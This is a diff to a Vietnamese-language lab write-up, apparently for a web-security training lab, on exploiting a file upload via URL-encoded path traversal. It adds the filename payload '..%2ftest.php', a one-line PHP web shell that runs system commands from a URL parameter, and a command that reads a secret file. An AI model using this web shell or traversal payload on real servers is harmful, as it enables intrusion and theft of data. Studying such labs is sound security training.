@@ -33,6 +33,28 @@ img
 
 img
 
-- Thử upload lại với các kí tự _'/'_ đã được mã hóa URL
+- Thử upload lại với các kí tự _'/'_ đã được mã hóa URL cụ thể ở đây `filename="..%2ftest.php"`
+
+img
+
+- Đường dẫn lưu file upload đã theo như ý ta muốn
+
+img
+
+- Khi truy cập file _test.php_ theo đường dẫn **_/files/test.php_** mã PHP đã được thực thi
+
+  img
+
+## 3. Tiến hành khai thác
+- Tạo một file tên _shell.php_ với nội dung là đoạn code php:
+
+```<?php echo system($_GET['x']) ?>```
+
+Đoạn code cho phép thực thi câu lệnh hệ thống, trong đó x là tham số ta có thể truyền vào qua URL.
+
+img
+img
+
+- Truyền tham số *'x'* để đọc nội dung tệp tin bí mật `x=cat%20/home/carlos/secret`
 
 img
